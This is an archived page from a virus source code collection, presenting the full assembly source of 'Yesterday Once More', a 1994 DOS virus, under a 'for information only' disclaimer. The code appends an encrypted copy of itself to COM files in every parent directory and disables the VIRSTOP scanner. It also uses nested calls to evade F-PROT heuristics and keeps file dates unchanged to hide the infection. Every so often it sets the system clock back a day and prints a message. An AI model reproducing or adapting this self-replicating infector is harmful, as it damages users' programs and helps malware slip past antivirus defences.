<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: yesterdy_asm</title>
<meta name="KEYWORDS" content="yesterdy.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for yesterdy.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="yale_1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yale_1_asm.php">yale_1_asm</a><br>
<a href="yale_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yale_2_asm.php">yale_2_asm</a><br>
<a href="yale__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yale__asm.php">yale__asm</a><br>
<a href="yale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yale_asm.php">yale_asm</a><br>
<a href="yale_asm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yale_asm_asm.php">yale_asm_asm</a><br>
<a href="yankee2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yankee2__asm.php">yankee2__asm</a><br>
<a href="yankee2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yankee2_asm.php">yankee2_asm</a><br>
<a href="yanshort_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yanshort_asm.php">yanshort_asm</a><br>
<a href="yanshrt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yanshrt_asm.php">yanshrt_asm</a><br>
<a href="yb_1a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yb_1a_asm.php">yb_1a_asm</a><br>
<a href="yb_1b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yb_1b_asm.php">yb_1b_asm</a><br>
<a href="yb_2a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yb_2a_asm.php">yb_2a_asm</a><br>
<a href="yb_2b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yb_2b_asm.php">yb_2b_asm</a><br>
<a href="yb-426_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yb-426_asm.php">yb-426_asm</a><br>
<a href="yb_x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yb_x_asm.php">yb_x_asm</a><br>
<a href="yb-x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yb-x_asm.php">yb-x_asm</a><br>
<a href="yd23_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yd23_asm.php">yd23_asm</a><br>
<a href="yesterdy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/yesterdy_asm.php">yesterdy_asm</a><br>
<a href="ynsho_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/ynsho_asm.php">ynsho_asm</a><br>
<a href="y_yank1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/y_yank1_asm.php">y_yank1_asm</a><br>
<a href="y-yank1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/y-yank1_asm.php">y-yank1_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;       YESTERDAY ONCE MORE

;       Thanks for Adenine (F-PROT screwing code taken from "Uracil")

;       Thanks also go for several other people for helping me in
;       several ways..

;       Author          : pepper (my first non-overwriting virus!)
;       Manufactured in : Finland
;       Length          : 529 bytes (YOM.COM = 534bytes, but decrease
;                                    5 bytes [mov ax, 4c00h, int 21h])
;       Date            : 01-April-94    
 
;       Detection       : F-PROT 2.11 doesn't detect this anyhow,
;                         with secure or heuristics scan...
;                         SCAN 1.13 won't also detect this..
 
;       Information     : *256 different forms of mutation. All the texts
;                          and some parts of code are mutated. Number #00
;                          of mutations is the unmutated virus.     
;                         *Infects COM-files, within the length of 123-63999
;                         bytes. Doesn't infect command.com.
;                         *Uses dotdot-method. Infects 2 files from every
;                         directory from current one to root directory.
;                         *Checks for previous infection 
;                         *Restores date and time stamps
;                         *Deinits VIRSTOP
;                         *Screws F-PROT
;                         *Displays 'yesterday once more' every 128th time   
;                          run and backs up clock by one day...
;                         *NOP's are because of that stupid scan thought
;                          that this was [Beta] virus.. wellwell..

;-------------------------------------------------------------------------
 
        .MODEL TINY
        .CODE
        org     100h
        assume  cs:@code;ds:@code;es:@code

duuh:
        nop
        nop
        call    $+8     ; jmp to label BEGIN


OrigProg:
mov     ax, 4c00h       ; original proggie, which
int     21h             ; returns to dos


begin:

        call    next                            ; find delta offset
next:   pop     bp
        sub     bp, offset next
        
        call    decrypt                         ; decrypt virus in
                                                ; memory

        mov     ax, 4653h

        call    screw_fprot

        mov     bx, 1
        mov     cx, 2
        rep     int 2fh                         ; un-install Virstop..

        mov     ah, 1Ah                         ; function 1A= Set DTA
        nop
        lea     dx, [bp+offset newDTA]
        int     21h                             ; set new dta ds:dx

        mov     ah, 047h
        nop
        mov     dl, 0
        lea     si, [bp+offset dirstring]
        int     021h                            ; Get current directory


traverse_loop:
loopx:
        lea     dx, [bp+offset com_spec]        ; filename points to *.COM
        call    infect                          ; find and infect files
        call    toparent                        ; return to ..
                                                ; returns CF if no '..' found
        jnc loopx                               ; do this until in root dir

infect_End:

        mov     si, bp
        add     si, Offset OrigProg
        push    sp
        call    screw_fprot
        pop     sp
        mov     di, 0100h
        movsw
        movsw
        nop
        movsb                                   ;Copy original bytes to...

        lea     di, [bp+offset TempShit]        ; TempShit = '\'
        mov     al, 092d
        stosb
        mov     ah, 03bh
        nop
        lea     dx, [bp+offset tempshit]
        int     021h                            ;Return to original directory

        mov     sp, 0FFFEh

        call    setdate

        mov     di, 0100h
        jmp     di

ToParent:
        mov     ah, 03bh
        lea     dx, [bp+offset dotdot]
        int     021h                            ; change dir to '..'
        ret


Tempones:
        mov     ax, 3D02h                       ; open file for R/W
        lea     dx, [bp+newDTA+30]              ; DTA ofs 30 = filename
        int     21h
        xchg    ax, bx                          ; file handle to BX

        mov     ah, 3Fh
        mov     cx, 05h
        push    sp
        call    screw_fprot
        pop     sp
        lea     dx, [bp+offset readbuffer]      ; Read 5 bytes from file
        int     21h                             ; to READBUFFER

        mov     ax, 4202h                       ; move file pointer to
        xor     cx, cx                          ; end of the file
        xor     dx, dx
        int     21h                             ; Return new position -> AX
        ret

infect:
        mov     cx, 020h                        ; Only 'archive' files
        mov     ah, 4Eh                         ; Find First File
        push    sp
        call    screw_fprot
        call    screw_fprot
        pop     sp
        push    sp
        call    screw_fprot
        call    screw_fprot
        pop     sp
        push    sp
        call    screw_fprot
        pop     sp

findfirstnext:
        int     21h
        jc    bye                               ; jump if carry flag
                                                ; (CF = ERROR!)
        call  Tempones
        jmp   checks
backfromcheck:

        mov     ah, 40h                         ; save 5 bytes from READ-
        mov     cx, 05h                         ; BUFFER to the begin of file
        lea     dx, [bp+offset readbuffer]
        int     21h                             ; write 5 bytes

        lea     si, [bp+offset encrypt_val]  
        mov     di, si
        lodsb
        inc     al
        stosb
        call    encrypt

        mov     ah, 40h                         ; Copy virus code to the end
        mov     cx, heap-begin                  ; of the file...............
        nop
        lea     dx, [bp+offset begin]           ; cx = byte count,
        int     21h                             ; ds:dx = user buffer

        call    decrypt

        mov     ax, 4200h
        xor     cx, cx                          ; Move file pointer to the
        xor     dx, dx                          ; beginning of the file...
        int     21h                             ; ........................

        mov     CX, Word Ptr [Bp+Offset NewDta+01Ah]
        mov     Word ptr [bp+offset readbuffer], 9090h
        mov     Byte ptr [bp+offset readbuffer+2], 0E8h
        mov     Word ptr [bp+offset readbuffer+3], CX

        mov     ah, 40h                         ; Write jump code to the begin
        mov     cx, 5                           ; of the file...............
        nop
        lea     dx, [bp+offset readbuffer]      ; cx = byte count,
        int     21h                             ; ds:dx = user buffer

        inc     [bp+numinfected]                ; Increase 'infected' counter

close:
        mov     ax, 5701h
        mov     cx, word ptr [bp+offset newdta+016h] ; set time
        nop
        mov     dx, word ptr [bp+offset newdta+018h] ; set date
        int     021h                            ; reset file time'n date.

        mov     ah, 3Eh                         ; Close File
        int     21h


        cmp     [bp+numinfected], 2
        jae     bye                             ; jump if above or equal
        mov     ah, 4Fh                         ; No, So Find Another File
        jmp     findfirstnext

bye:
        push    sp
        call    screw_fprot
        pop     sp

        ret

close2:
        jmp close

decrypt:
encrypt:
     mov ah, [bp+encrypt_val]

     mov cx, [offset tempshit - offset com_spec - 2]
        nop
     lea si, [bp+offset com_spec]
     mov di, si

xor_loop:
     lodsb                 ; DS:[SI] -> AL
     xor al, ah
     stosb                 ; AL -> ES:[DI]
        nop
     loop xor_loop
     ret


encrypt_val     db      0
numinfected     db      0                       ; Number Of Files Infected
DotDot          db      '..',0

;ENCRYPTED AREA BEGIN

com_spec        db      '*.COM',0               ; COM Filespec

SetDate:
        mov     ah, 1Ah                         ; Function 1Ah=Set DTA
        mov     dx, 80h
        nop
        int     21h                             ; reset old DTA to
                                                ; DOS' default offset 80h
        push    es
        mov     ax, 040h
        nop
        mov     es, ax
        cmp     byte ptr [ES:6Ch], 02
        pop     es
        jae     EndOfSetDate                    ; Set date just every
                                                ; 128th time of run..
        mov     ah, 02ah
        int     21h                             ;get date
        cmp     dl, 1                           ;if day = 01.xx.xx, don't set
        je      EndOfSetDate

        dec     dl
        mov     ah, 02bh
        int     21h                             ;set date to original-1
        mov     ah, 09h
        lea     dx, [bp+message]
        int     21h                             ;output message to screen!

EndOfSetDate:
        ret                                     ;return to to host routine

checks:
        mov     cx, Word Ptr [bp+offset NewDta+015h]
        and     cx, 031d
        nop
        cmp     cx, 0                           ; files may have only
        jne     close2                          ; archive bit on...

        mov     cx, Word Ptr [bp+offset NewDta+01ah]
        cmp     cx, 64000d
        jae     close2

        cmp     cx, 122d
        jbe     close2

        mov     cl, byte ptr [bp+offset readbuffer+1]
        cmp     cl, 090h
        je      close2                          ; Already Infected

        cmp     word ptr [bp+offset NEWDTA+35], 'DN' ; don't infect
        je      close2                               ; COMMAND.COM

        jmp     backfromcheck

screw_fprot:
                jmp  $ + 2                 ;  Nested calls to confuse
                call screw2                ;  f-protect's heuristic
                call screw2                ;  analysis
                call screw2                ;
                call screw2                ;
        nop
                call screw2                ;
                ret                        ;
screw2:                                    ;
                jmp  $ + 2                 ;
                call screw3
                call screw3
                call screw3
                call screw3                ;
                call screw3                ;
                ret                        ;
screw3:                                    ;
                jmp  $ + 2                 ;
                call screw4
                call screw4
                call screw4                ;
        nop
                call screw4                ;
                call screw4                ;
                ret                        ;
screw4:                                    ;
                jmp  $ + 2                 ;
                ret                        ;
notshown_msg    db      '[pepper] '
message         db      'yesterday once more',13,10,'$'

;ENCRYPTED AREA END

TempShit        db      '\'
heap:
DirString       db      80h dup (?)             ; original dir is saved here.
newdta          db      43 dup (?)              ; New Disk Transfer Access
readbuffer      db      5h dup (?)
heap_end:
end duuh

; -pepper 94-

</textarea></td></tr></table></body></html>
